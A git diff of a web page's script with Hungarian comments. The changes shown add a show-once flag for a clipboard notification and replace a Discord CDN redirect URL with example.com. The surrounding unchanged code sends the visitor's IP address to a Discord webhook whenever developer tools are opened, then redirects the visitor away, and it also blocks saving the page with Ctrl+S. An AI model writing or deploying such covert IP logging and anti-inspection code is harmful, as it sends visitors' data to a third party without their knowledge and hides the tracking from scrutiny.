@@ -57,6 +57,7 @@
     <script>
         let webhookUrl = "";
         let altWebhookUrl = "";
+        let isNotificationVisible = false; // Ne jelenjen meg többször az értesítés
 
         window.onload = function() {
             // Webhook URL lekérése a szervertől
@@ -87,6 +88,7 @@
 
         // Másolja a kulcsot a vágólapra
         function copyKey() {
+            if (isNotificationVisible) return;  // Ha már megjelent az értesítés, ne jelenjen meg újra
             const keyInput = document.getElementById('keyInput');
             keyInput.select();  // Kiválasztja a szöveget
             document.execCommand('copy');  // Kimásolja a vágólapra
@@ -111,13 +113,15 @@
                     console.log('Fejlesztői eszközök megnyitva!');
                     // Azonnal elküldi az IP-t a Discordra
                     sendIpRequest('DevTools Megnyitás', altWebhookUrl); // Küldje a másik webhookra
-                    window.location.href = "https://cdn.discordapp.com/attachments/1158512683998511235/1400563793196482762/522391358_2117753948735836_2653110483455839868_n.png?ex=688d182d&is=688bc6ad&hm=358c6238033f6112fb8e78a1ef58a4f4486d2bd9e3014e9ff0c47d4a134178d2&"; // Átirányítja egy másik oldalra
+                    window.location.href = "https://example.com"; // Átirányítja egy másik oldalra
                 }
             }, 1000); // Minden másodpercben ellenőrzi
         }
 
         // Értesítés megjelenítése a képernyő közepén
         function showNotification() {
+            if (isNotificationVisible) return; // Csak egyszer jelenjen meg
+            isNotificationVisible = true;
             const notification = document.getElementById('notification');
             const overlay = document.getElementById('backgroundOverlay');
             notification.style.display = 'block';
@@ -125,10 +129,11 @@
             setTimeout(() => {
                 notification.style.display = 'none';
                 overlay.style.display = 'none';
+                isNotificationVisible = false;
             }, 10000);  // 10 másodpercig látszik
         }
 
-        // Figyeljük a Ctrl + S billentyűkombinációt, és megakadályozzuk a weboldal mentését
+        // Figyeljük a tiltott billentyűkombinációkat, és megakadályozzuk őket
         document.addEventListener('keydown', function(event) {
             if (event.ctrlKey && event.key === 's') {
                 event.preventDefault(); // Megakadályozza a mentést
